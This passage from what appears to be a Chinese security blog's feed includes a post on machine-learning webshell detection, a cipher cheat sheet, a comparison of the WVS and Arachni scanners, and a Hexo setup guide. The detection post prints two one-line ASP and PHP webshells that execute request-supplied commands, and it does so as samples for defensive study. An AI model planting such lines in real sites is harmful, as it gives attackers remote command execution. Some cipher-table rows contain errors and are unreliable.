        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>人工智能，机器学习，深度学习，对抗网络这些名词逐渐深入人心，在社会的各个方面都有着AI技术的身影。但是真正了解这项技术的人才其实十分的缺乏。</p><p>目前AI技术大方向主要包含图像处理，信号处理，文本处理等等方面，在这些大方向之下，针对不同的行业，不同的需求逐渐形成了各个行业中自己独特的AI技术发展及应用方向。在很多领域中已经有了成熟的AI技术研究方向和产业体系，但是在安全领域还处于起步阶段，大家都在想着分一杯羹。</p><p>身为安全行业从业人员，更加体会到这个领域急需AI技术的帮助。因为在现在的互联网世界中，安全防御体系无时无刻不在应对新的挑战。哪怕是拥有丰富工作经验的安全从业者，在面对层出不穷的攻击手段和海量的日志数据时也会望洋兴叹。AI技术是这些问题天然契合的解决方案，特别是数据量指数级爆炸增长的信息时代，AI技术甚至会发展成为唯一的出路。</p><span id="more"></span><h2 id="契机"><a href="#契机" class="headerlink" title="契机"></a>契机</h2><p>由于本身就是信息安全专业毕业，算是根正苗红的科班出身。在AI技术横行的当代，在大学中天天接受这方面知识的熏陶，自然而然走上了AI + Security的道路。正好现工作的公司处于一个特殊的时期，也算是为之后的工作练练手打基础，利用机器学习实现了一个从源码角度检测Webshell脚本的简单系统。</p><p>现在传统的检测Webshell的方式无非特征检测或者规则库匹配，这样的检测方法有着很高的准确度，但是弊端也显而易见。永远追随着Webshell的脚步，对于新出现的Webshell无能为力。而且Webshell的特征库或者规则库各大安全公司或者厂商都有自己的资源，不会向公众开放，也不会共享。闭门造车自然会造成以偏概全，覆盖面小的问题。而AI技术检测Webshell则不存在这些问题，诚然目前这种检测Webshell的方式比特征检测的方式误报率更高，可是这只是样本数据量太小的问题，这个随着时间发展很简单就可以解决，将来的效果一定会远远超越传统方式。</p><h2 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h2><p>我基于NB算法实现了这样一款<a href="https://github.com/Coldwave96/WebShell-Detection_System">Webshell检测工具</a>，具体用法在README.md文件中有解释，比较简单，只是自己学习一个副产物，仅做实验用，欢迎留言和我交流^。^</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><p>最初设计时有两种思路。第一种是处理ADFA-LD数据集那样的数据，ADFA-LD数据集记录的是系统调用序列，然后用数字标识每一个系统调用，这样可以得到一个系统调用序列。但是ADFA-LD数据集这样的数据限制太多，适用面太小，需要强大的设备或者技术对前期数据进行处理，所以放弃了这一种方法。最终选择的是第二种思路，借用自然语言处理技术，直接对源代码进行处理，适用面比较广，但是也存在一些问题，后面会详细叙述。</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>处理的原始数据就是Webshell源码(php，asp，jsp格式)：</p><p><img src="/img/WebshellDetection/WebshellDetection1.png" alt="cmdjsp.jsp"></p><p>或是这样的一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute request(&quot;include&quot;)%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;&lt;body bgcolor=white&gt;&lt;? @system($_REQUEST[&quot;cmd&quot;]); ?&gt;&lt;/body&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>所以首先需要将文本数据读取出来，通过<code>load_str(filepath)</code>方法，把一个文件作为一个完整的字符串处理，过滤掉文件中的回车换行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_str</span>(<span class="params">filepath</span>):</span><br><span class="line">    t = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            line = line.strip(<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">            line = line.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            t += line</span><br><span class="line">    <span class="keyword">return</span> t</span><br></pre></td></tr></table></figure><p>由于样本中可能存在大量的图片、JavaScript，所以遍历目录时需要过滤掉非我们想要的格式的文件。通过<code>load_file(dir)</code>方法递归实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_files</span>(<span class="params"><span class="built_in">dir</span></span>):</span><br><span class="line">    files_list = []</span><br><span class="line">    g = os.walk(<span class="built_in">dir</span>)</span><br><span class="line">    <span class="keyword">for</span> path, d, filelist <span class="keyword">in</span> g:</span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> filelist:</span><br><span class="line">            <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.php&#x27;</span>) <span class="keyword">or</span> filename.endswith(<span class="string">&#x27;.txt&#x27;</span>):</span><br><span class="line">                fulpath = os.path.join(path, filename)</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;Load %s&quot;</span> % fulpath</span><br><span class="line">                t = load_str(fulpath)</span><br><span class="line">                files_list.append(t)</span><br><span class="line">    <span class="keyword">return</span> files_list</span><br></pre></td></tr></table></figure><p>加载搜集到的Webshell脚本和其他开源软件源码分别作为黑，白样本,，并统计样本个数，将Webshell样本标记为1，正常的源码标记为0：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">webshell_files_list = load_files(webshell_dir)</span><br><span class="line">y1 = [<span class="number">1</span>] * <span class="built_in">len</span>(webshell_files_list)</span><br><span class="line">black_count = <span class="built_in">len</span>(webshell_files_list)</span><br><span class="line"></span><br><span class="line">normal_files_list = load_files(normal_dir)</span><br><span class="line">y2 = [<span class="number">0</span>] * <span class="built_in">len</span>(normal_files_list)</span><br><span class="line">white_count = <span class="built_in">len</span>(normal_files_list)</span><br></pre></td></tr></table></figure><p>合并样本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = webshell_files_list + normal_files_list</span><br><span class="line">y = y1 + y2</span><br></pre></td></tr></table></figure><p>本次使用自然语言处理方法中最常见最基础的2-Gram提取词袋模型，并使用TF-IDF进行处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CV = CountVectorizer(ngram_range = (<span class="number">2</span>, <span class="number">2</span>), decode_error = <span class="string">&#x27;ignore&#x27;</span>, max_features = max_features, token_pattern = <span class="string">r&#x27;\b\w+\b&#x27;</span>, min_df = <span class="number">1</span>, max_df = <span class="number">1.0</span>)</span><br><span class="line">x = CV.fit_transform(x).toarray()</span><br><span class="line"></span><br><span class="line">transformer = TfidfTransformer(smooth_idf = <span class="literal">False</span>)</span><br><span class="line">x_tfidf = transformer.fit_transform(x)</span><br><span class="line">x = x_tfidf.toarray()</span><br></pre></td></tr></table></figure><p>2-Gram算法是N-Gram算法的一种类型，简单理解就是截取相邻的每2个字符作为词袋。本次为了增加效率，将提取的词袋建立对应字典。</p><p>此时文本数据将被转换成数组，然后将处理后的数据投入训练，实例化一个模型，通过<code>do_GNB(x, y)</code>方法实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do_GNB</span>(<span class="params">x, y</span>):</span><br><span class="line">    x_train, x_test, y_train, y_test = train_test_split(x, y, test_size=<span class="number">0.4</span>, random_state=<span class="number">0</span>)</span><br><span class="line">    clf = GaussianNB()</span><br><span class="line">    clf.fit(x_train, y_train)</span><br><span class="line">    y_pred = clf.predict(x_test)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;GNB_php.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pickle.dump(clf, f)</span><br><span class="line"></span><br><span class="line">    do_metrics(y_test, y_pred)</span><br></pre></td></tr></table></figure><p>同时将训练好的模型保存为.pickle格式的文件，这样可以直接调用模型预测新的未知文件是否为Webshell脚本。不用每次都重新训练模型，增加效率。</p><h2 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h2><p>运行后的结果如下图所示：</p><p><img src="/img/WebshellDetection/WebshellDetection2.png"></p><p><img src="/img/WebshellDetection/WebshellDetection3.png"></p><p>经过统计，准确度超过9成，同时误报率不超过1%。不过暂时手上的数据量比较少，所以实际情况中可能达不到预期的性能。</p><h2 id="问题归总"><a href="#问题归总" class="headerlink" title="问题归总"></a>问题归总</h2><h3 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h3><p>前文说过设计思路上有个问题，其实就是现在很多Webshell脚本都是加密的，如何去分辨。对于这个问题也很好解释，正常的源码文件也不会费力的去加密，所以很多加密的文件确实本身就存在问题，值得我们好好的去分析。对于某些加密方式其实是在我们的知识库里的，可以考虑在数据处理的时候加一个简单的解密流程。但是不太推荐花费过多的精力和资源在解密上，这样会造成效率的低下。</p><h3 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h3><p>这种方法优势很明显，就是能够让我们走在危险的前面，这在安全领域很可贵，但是不可避免的存在误报率的问题。对于这个问题，也有一些解决方法。一是不断的扩展样本集，其实样本对于AI技术很重要，对最终预测结果的准确度有很大的影响。其实这也是这种检测方法的一个优势，仅仅通过更加契合的样本集就能够大幅度的提高预测结果的准确度，同时降低误报率。二是在数据处理部分寻找更好的方法。本次采用的只是自然语言处理方面最普通的处理手段，随着AI技术的不断发展，一定会出现更多更好的数据处理技术。最后从来没有完美的技术，这种Webshell检测方法可以和传统方法结合，相信可以得到更好的结果。</p>]]></content>
      
      
      <categories>
          
          <category> Program </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
            <tag> Webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古典密码对照</title>
      <link href="/2019/11/06/Codemap/"/>
      <url>/2019/11/06/Codemap/</url>
      
        <content type="html"><![CDATA[<p>最近在刷CTF密码学以及MISC的时候遇到一些古典的加密方式，下面是总结的一些古典加密方法对照表。</p><span id="more"></span><h2 id="QWE"><a href="#QWE" class="headerlink" title="QWE"></a>QWE</h2><center>a b c d e f g h i j k l m n o p q r s t u v w x y z</center><center>q w e r t y u i o p a s d f g h j k l z x c v b n m</center><h2 id="atbash（反字母）"><a href="#atbash（反字母）" class="headerlink" title="atbash（反字母）"></a>atbash（反字母）</h2><center>a b c d e f g h i j k l m n o p q r s t u v w x y z</center><center>z y x w v u t s r q p o n m l k j i h g f e d c b a</center><h2 id="PC键盘"><a href="#PC键盘" class="headerlink" title="PC键盘"></a>PC键盘</h2><center>a b c d e f g h i j k l m n o p q r s t u v w x y z</center><center>12 53 33 32 31 42 52 62 81 72 82 92 73 63 91 01 11 41 22 51 71 43 21 23 61 13</center><h2 id="5-5矩阵"><a href="#5-5矩阵" class="headerlink" title="5*5矩阵"></a>5*5矩阵</h2><center>a b c d e f g h i j k l m n o p q r s t u v w x y z</center><center>11 12 13 14 15 21 22 23 24 24 25 31 32 33 34 35 41 42 43 44 45 51 52 53 54 55</center>注：此类存在变式，不是唯一对照规则。<h2 id="摩斯"><a href="#摩斯" class="headerlink" title="摩斯"></a>摩斯</h2><center>A *- B -*** C -*-* D -** E * F **-* G --* H **** I ** J *--- K -*- L *-** M -- N -* O --- P *--* Q --*- R *-* S *** T - U **- V ***- W *-- X -**- Y -*-- Z --** 0 ----- 1 *---- 2 **--- 3 ***-- 4 ****- 5 ***** 6 -**** 7 --*** 8 ---** 9 ----*</center><h2 id="MNB"><a href="#MNB" class="headerlink" title="MNB"></a>MNB</h2><center>a b c d e f g h i j k l m n o p q r s t u v w x y z</center><center>m n b v c x z l k j h g f d s a p o i u y t r e w q</center>注：属QWE同类的对应。扩展：qaz--abc等竖向对应。<h2 id="三进制"><a href="#三进制" class="headerlink" title="三进制"></a>三进制</h2><center>a b c d e f g h i j k l m n o p q r s t u v w x y z</center><center>001 002 010 011 012 020 021 022 100 101 102 110 111 112 120 121 122 200 201 202 210 211 212 220 221 222</center><h2 id="键盘V字"><a href="#键盘V字" class="headerlink" title="键盘V字"></a>键盘V字</h2><center>a b c d e f g h i j k l m n o p q r s t u v w x y z</center><center>13 58 36 35 34 46 57 68 89 79 80 9- 70 69 90 0- 12 45 24 56 78 47 23 25 67 14</center><h2 id="三分密码"><a href="#三分密码" class="headerlink" title="三分密码"></a>三分密码</h2><center>a b c d e f g h i j k l m n o p q r s t u v w x y z</center><center>111 121 131 112 122 132 113 123 133 211 221 231 212 222 232 213 223 233 311 321 331 312 322 332 313 323</center>三分密码理解为把字母排成：（仿九宫格）<table><thead><tr><th align="center"></th><th align="center">1</th><th align="center">2</th><th align="center">3</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">abc</td><td align="center">def</td><td align="center">ghi</td></tr><tr><td align="center">2</td><td align="center">jkl</td><td align="center">mon</td><td align="center">opq</td></tr><tr><td align="center">3</td><td align="center">stu</td><td align="center">vwx</td><td align="center">yz</td></tr></tbody></table><p>第一位行数，第三位列数，中间该格的第几个字母。</p><h2 id="ADFGVX"><a href="#ADFGVX" class="headerlink" title="ADFGVX"></a>ADFGVX</h2><h3 id="原始对应"><a href="#原始对应" class="headerlink" title="原始对应"></a>原始对应</h3><center>a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9</center><center>DV FF FG AG XD XV GV DX VG GA FD AV GX AX DG AD XX VV VD DD GD VF GG VA XF FX XG DA VX AF DF FV GF FA AA XA</center><h3 id="按顺序"><a href="#按顺序" class="headerlink" title="按顺序"></a>按顺序</h3><center>a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9</center><center>AA AD AF AG AV AX DA DD DF DG DV DX FA FD FF FG FV FX GA GD GF GG GV GX VA VD VF VG VV VX XA XD XF XG XV XX</center><p>为了帮助理解，下面放出一个字典表实例：</p><table><thead><tr><th align="center"></th><th align="center">A</th><th align="center">D</th><th align="center">F</th><th align="center">G</th><th align="center">X</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">b</td><td align="center">t</td><td align="center">a</td><td align="center">l</td><td align="center">p</td></tr><tr><td align="center">D</td><td align="center">d</td><td align="center">h</td><td align="center">o</td><td align="center">z</td><td align="center">k</td></tr><tr><td align="center">F</td><td align="center">q</td><td align="center">f</td><td align="center">v</td><td align="center">s</td><td align="center">n</td></tr><tr><td align="center">G</td><td align="center">g</td><td align="center">j</td><td align="center">c</td><td align="center">u</td><td align="center">x</td></tr><tr><td align="center">X</td><td align="center">m</td><td align="center">r</td><td align="center">e</td><td align="center">w</td><td align="center">y</td></tr></tbody></table><h2 id="键盘移位"><a href="#键盘移位" class="headerlink" title="键盘移位"></a>键盘移位</h2><h3 id="右移"><a href="#右移" class="headerlink" title="右移"></a>右移</h3><center>q w e r t y u i o p a s d f g h j k l z x c v b n m</center><center>w e r t y u i o p a s d f g h j k l z x c v b n m q</center><h2 id="左移"><a href="#左移" class="headerlink" title="左移"></a>左移</h2><center>q w e r t y u i o p a s d f g h j k l z x c v b n m</center><center>m q w e r t y u i o p a s d f g h j k l z x c v b n</center><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><center>q w e r t y u i o p a s d f g h j k l z x c v b n m</center><center>§ № ☆ ★ ○ ● ◎ ◇ ◆ □ ■ △ ▲ ※ → ← ↑ ↓ 〓 ＃ ＆ ＠ ＼ ＾ ＿ ￣</center><h2 id="dvorak键盘"><a href="#dvorak键盘" class="headerlink" title="dvorak键盘"></a>dvorak键盘</h2><center>a b c d e f g h i j k l m n o p q r s t u v w x y z</center><center>p y f g c r l a o e u i d h t n s q j k x s m w v z</center><h2 id="费娜姆密码（即密码管）"><a href="#费娜姆密码（即密码管）" class="headerlink" title="费娜姆密码（即密码管）"></a>费娜姆密码（即密码管）</h2><center>A 1000001 B 1000010 C 1000011 D 1000100 E 1000101 F 1000110 G 1000111 H 1001000 I 1001001 J 1001010 K 1001011 L 1001100 M 1001101 N 1001110 O 1001111 P 1010000 Q 1010001 R 1010010 S 1010011 T 1010100 U 1010101 V 1010110 W 1010111 X 1011000 Y 1011001 Z 1011010</center><h2 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h2><center>A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb U babaa V babab W babba X babbb Y bbaaa Z bbaab</center><p>注1：培根密码有两种对应，这是较为常用的一种。<br>注2：替代成a&#x3D;1,b&#x3D;0或a&#x3D;0,b&#x3D;1，作为1和0的培根也是可以的。</p><h2 id="台湾拼音"><a href="#台湾拼音" class="headerlink" title="台湾拼音"></a>台湾拼音</h2><center>ㄅ->b ㄉ->d ㄓ->zh ㄚ->a ㄞ->ai ㄦ->er ㄆ->p ㄊ->t ㄍ->g ㄐ->j ㄔ->ch ㄗ->z 一->i ㄛ->o ㄟ->ei ㄣ->en ㄇ->m ㄋ->n ㄎ->k ㄑ->q ㄕ->sh ㄘ->c ㄨ->u ㄜ->e ㄠ->ao ㄤ->ang ㄈ->f ㄌ->l ㄏ->h ㄒ->x ㄖ->r ㄙ->s ㄩ->..(就是拼音输入法v) u ㄝ->e(和ㄜ->e不同的是,ㄜ用在ye,te,de声母后面,而ㄝ,只能跟在yue,tie之类韵母后面) ㄡ->ou ㄥ->eng ㄢ->an</center><h2 id="北约音标"><a href="#北约音标" class="headerlink" title="北约音标"></a>北约音标</h2><center>A Alpha B Bravo C Charlie D Delta E Echo F Foxtrot G Golf H Hotel I India J Juliet K Kilo L Lima M Mike N November O Oscar P Papa Q Quebec R Romeo S Sierra T Tango U Uniform V Victor W Whiskey X X-ray Y Yankee Z Zulu 0 Zero 1 Wun 2 Two 3 Three（或Tree） 4 Four 5 Five 6 Six 7 Seven 8 Eight 9 Niner</center><h2 id="标准电阻值"><a href="#标准电阻值" class="headerlink" title="标准电阻值"></a>标准电阻值</h2><center>黑 棕 红 橙 黄 绿 蓝 紫 灰 白</center><center>0 1 2 3 4 5 6 7 8 9</center><h2 id="中文电码（汉字代码）"><a href="#中文电码（汉字代码）" class="headerlink" title="中文电码（汉字代码）"></a>中文电码（汉字代码）</h2><p>这种方式可以叫做编码方式，具体对应规则网上有很多，需要时可自行百度。</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> Cryptography </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Encrypt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WVS与Arachni对比实验</title>
      <link href="/2019/11/06/scan/"/>
      <url>/2019/11/06/scan/</url>
      
        <content type="html"><![CDATA[<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>本次实验旨在熟悉Windowsxitong下的WVS和Kali’系统下的Arachni两种漏洞扫描工具，并在此基础上比较和总结两种工具特点及不足。</p><h2 id="实验工具及靶机"><a href="#实验工具及靶机" class="headerlink" title="实验工具及靶机"></a>实验工具及靶机</h2><ol><li>   Windows系统下的WVS 10.5版本漏洞扫面工具；</li><li>   Linux Kali系统下的arachni-1.5.1-0.5.12版本漏洞扫描工具；</li><li>   OWASP Broken Web Apps VM v1.2靶机。</li></ol><span id="more"></span><h2 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h2><p><img src="/img/scan/scan1.png" alt="实验网络拓扑图"></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><ol><li>   在windows虚拟机中利用WVS工具对靶机进行扫描；</li><li>   在Kali虚拟机中利用arachni工具对靶机进行扫描；</li><li>   根据两个工具得出的扫描报告进行对比，得到本次实验的结果。</li></ol><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><h3 id="扫描速度"><a href="#扫描速度" class="headerlink" title="扫描速度"></a>扫描速度</h3><p>wvs的扫描速度相比较arachni直接扫描个人感觉要快一点，但是当arachni开启分布式扫描之后速度会有大幅度提高，具体提升多少由于没有具体尝试过所以还没发给出明确数据，可能需要后续的继续实验。</p><h3 id="扫描隐蔽性"><a href="#扫描隐蔽性" class="headerlink" title="扫描隐蔽性"></a>扫描隐蔽性</h3><p>WVS一般用于对企业内联网，外延网或者面向其他人员客户等的web网站，应用环境基本是不考虑扫描隐蔽性问题的情况。而arachni分布式扫描除了可以大幅提高扫描速度之外，还能够将负载分散到其他机器和端口，能够一定程度上隐蔽自己。</p><h3 id="扫描全面性及功能"><a href="#扫描全面性及功能" class="headerlink" title="扫描全面性及功能"></a>扫描全面性及功能</h3><p>通过对比本次实验对同一台靶机的两种工具扫描结果，发现arachni扫描到的漏洞或威胁数量上远远少于wvs的结果（PS.当然wvs中也有不少威胁属于误报。），从下面的图片中可以直观的察觉。</p><p><img src="/img/scan/scan2.png" alt="WVS扫描结果概览"></p><p><img src="/img/scan/scan3.png" alt=" arachni扫描结果概览（共45个Issues）"></p><p>个人感觉arachni主要专注于协议以及网站数据流量方面的问题，对于注入漏洞没有很好的检测。而wvs在注入漏洞方面下了很大的功夫，还会在扫描结果中给出其自动化注入脚本尝试的每一次注入语句及反馈。</p><p>另外wvs还提供一些手动工具，可以手动去验证扫描出的威胁是否确确实实是存在的漏洞，这也是前文提到的wvs只是列出威胁而不是仅仅上报确定的漏洞。Arachni列出的所有Issues不清楚是否全是确定验证过的漏洞，这一条也需要后续的继续实验。</p><p><img src="/img/scan/scan4.png" alt="wvs扫描到的漏洞类型列表"></p><h3 id="扫面结果呈现"><a href="#扫面结果呈现" class="headerlink" title="扫面结果呈现"></a>扫面结果呈现</h3><p>（1）对于XSS漏洞，两个工具呈现的报告结果差不多，首先均是对XSS的简介以及概述上的修复意见，之后会列出本网站检测到存在XSS漏洞的文件，最后会给出扫描XSS漏洞时发出的探测包及证明网站存在XSS漏洞的响应包。wvs会同时给出怀疑存在XSS漏洞以及确认存在XSS漏洞的文件。</p><p>（2）对于注入漏洞，由于arachni没有扫描到注入漏洞所以只能说wvs的情况，正如上面所说的，wvs也给出怀疑存在注入漏洞确认存在注入的文件，并说明测试语句。</p><p>（3）wvs还给出了很多其他类型的漏洞，比如CSRF，弱口令，上传漏洞等问题，相较之下arachni全面性上就不足了。</p><p><img src="/img/scan/scan5.png" alt="wvs扫描的请求及响应包"></p><p><img src="/img/scan/scan6.png" alt="arachni扫描的请求及响应包"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过本次实验，大体上了解了两款漏扫工具的使用，功能及特色，但也只是略懂皮毛，上面也提到了还需继续研究的两个问题。</p><p>总体上来说，wvs是一款功能强大的漏扫工具，对于安全人员来说算是一款神器，但对于攻击人员来说就有点鸡肋。Arachni正如介绍所说是一款功能算不上强大但是很有特色的漏扫工具。对于安全人员来说不算好用，但是对于攻击人员来说可能就会很好用，因为其Ruby框架，功能一般的问题就可以通过集成其他的工具弥补，再加上分布式扫描的优势可能让其更加受到攻击者的青睐。</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> Penetration Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Scan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo + Github搭建免费个人博客</title>
      <link href="/2019/11/06/CreateBlogs/"/>
      <url>/2019/11/06/CreateBlogs/</url>
      
        <content type="html"><![CDATA[<p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;<a href="https://github.com/">Github</a>是收到广大程序猿追捧的网站，各种源码资源应有尽有。<a href="https://hexo.io/">Hexo</a>是一款轻量级的Blog框架，安装和配置都很简单。两者结合即可搭建属于自己的免费博客，省时省力，既不用花钱买VPS，也不用花时间维护，这是属于白嫖党的胜利。</p><span id="more"></span><h2 id="Step-1：创建Github账户"><a href="#Step-1：创建Github账户" class="headerlink" title="Step 1：创建Github账户"></a>Step 1：创建Github账户</h2><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;创建<a href="https://github.com/">Github</a>账户这一步比较简单，就不赘述了。</p><h2 id="Step-2：创建Github-Pages"><a href="#Step-2：创建Github-Pages" class="headerlink" title="Step 2：创建Github Pages"></a>Step 2：创建Github Pages</h2><h3 id="2-1-创建仓库"><a href="#2-1-创建仓库" class="headerlink" title="2.1 创建仓库"></a>2.1 创建仓库</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;首先新建一仓库，注意仓库的名字一定要为[Owner].github.io，这样才可以通过https:&#x2F;&#x2F;[Owner].github.io访问我们创建的Github Pages。</p><p><img src="/img/CreateBlogs/CreateBlogs1.png"></p><p><img src="/img/CreateBlogs/CreateBlogs2.png"></p><h3 id="2-2-任意选择一个主题"><a href="#2-2-任意选择一个主题" class="headerlink" title="2.2 任意选择一个主题"></a>2.2 任意选择一个主题</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;对新建的仓库选择settings，然后将设置页面拉倒最底下，找到GitHub Pages部分，任意选择一个主题即可。</p><p><img src="/img/CreateBlogs/CreateBlogs3.png"></p><p><img src="/img/CreateBlogs/CreateBlogs4.png"></p><p><img src="/img/CreateBlogs/CreateBlogs5.png"></p><p><img src="/img/CreateBlogs/CreateBlogs6.png"></p><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;这样就完成了Github Pages的设置，访问我们的博客主页https:&#x2F;&#x2F;[Owner].github.io，就可以看到暂时搭建好的主页模版。</p><h2 id="Step-3：安装Git"><a href="#Step-3：安装Git" class="headerlink" title="Step 3：安装Git"></a>Step 3：安装Git</h2><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;前往<a href="https://git-scm.com/">Git官网</a>下载安装即可，安装过程中所有选项均默认即可。</p><h2 id="Step-4：安装Node-js"><a href="#Step-4：安装Node-js" class="headerlink" title="Step 4：安装Node.js"></a>Step 4：安装Node.js</h2><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;前往<a href="https://nodejs.org/en/">Node.js官网</a>下载安装即可，安装过程中的所有选项也均默认即可。</p><h2 id="Step-5：安装Hexo"><a href="#Step-5：安装Hexo" class="headerlink" title="Step 5：安装Hexo"></a>Step 5：安装Hexo</h2><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;下面是最关键的一步了，就是安装Hexo。创建一个用来存放Hexo组件的目录，例如D:\Blogs，进入该目录，右键选择Git Bash here。</p><p><img src="/img/CreateBlogs/CreateBlogs7.png"></p><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;然后使用npm安装hexo客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;下载好hexo后，进行初始化：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;查看所安装的hexo版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo -v</span><br></pre></td></tr></table></figure><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;查看帮助说明文档：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo h</span><br></pre></td></tr></table></figure><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;打开本地博客目录下的_config.yml文件，最下面找到Deployment模块，将标记的部分替换成自己的[Owner]即可：</p><p><img src="/img/CreateBlogs/CreateBlogs8.png"></p><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;使用hexo s在本地4000端口开启服务，浏览器访问<a href="http://127.0.0.1:4000/">http://127.0.0.1:4000</a> 即可看到我们的博客首页：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo s</span><br></pre></td></tr></table></figure><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;这样个人博客就算搭建成功了，之后的工作就是美化自己的博客，发布blogs了。当然所有要发布的blogs需要用markdown语法去写，然后保存为.md格式的文件，放到之前你创建的文件夹下的&#x2F;source&#x2F;_posts&#x2F;m目录下。</p><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;本地写好博文，用hexo 